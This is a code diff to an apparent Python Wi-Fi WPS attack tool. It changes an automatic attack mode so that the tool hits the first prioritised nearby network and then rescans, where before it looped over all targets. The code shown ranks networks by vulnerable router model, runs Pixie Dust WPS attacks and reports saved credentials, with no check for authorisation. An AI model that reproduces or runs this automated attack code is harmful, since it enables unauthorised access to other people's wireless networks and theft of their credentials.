@@ -1208,7 +1208,7 @@ def auto_attack_mode(args):
                     continue
                 if network['WPS locked']:
                     continue
-                
+
                 target_info = {'bssid': network['BSSID'], 'essid': network.get('ESSID', 'HIDDEN')}
 
                 if model in vuln_list:
@@ -1217,22 +1217,23 @@ def auto_attack_mode(args):
                     white_targets.append(target_info)
 
             prioritized_targets = green_targets + white_targets
-            
+
             if not prioritized_targets:
                 print("[i] No new networks to attack. Waiting for new networks to appear...")
                 time.sleep(30)
                 continue
 
-            for target in prioritized_targets:
-                print(f"[*] Attacking {target['essid']} ({target['bssid']})")
-                companion = Companion(args.interface, args.write, print_debug=args.verbose, bssid=target['bssid'], save_location=args.location, attempt_timeout=args.attempt_time)
-                if companion.single_connection(bssid=target['bssid'], pixiemode=True, showpixiecmd=args.show_pixie_cmd, pixieforce=args.pixie_force):
-                    print(f"[+] Successfully attacked {target['essid']}. Credentials saved.")
-                    stored_networks.add(target['bssid'])
-                else:
-                    print(f"[-] Attack on {target['essid']} failed.")
-                # companion.cleanup()
-                time.sleep(5) # Brief pause between attacks
+            # Attack only the first target, then rescan
+            target = prioritized_targets[0]
+            print(f"[*] Attacking {target['essid']} ({target['bssid']})")
+            companion = Companion(args.interface, args.write, print_debug=args.verbose, bssid=target['bssid'], save_location=args.location, attempt_timeout=args.attempt_time)
+            if companion.single_connection(bssid=target['bssid'], pixiemode=True, showpixiecmd=args.show_pixie_cmd, pixieforce=args.pixie_force):
+                print(f"[+] Successfully attacked {target['essid']}. Credentials saved.")
+                stored_networks.add(target['bssid'])
+            else:
+                print(f"[-] Attack on {target['essid']} failed.")
+            # companion.cleanup()
+            time.sleep(5) # Brief pause before rescanning
 
         except KeyboardInterrupt:
             print("\n[!] Auto-attack mode stopped by user.")
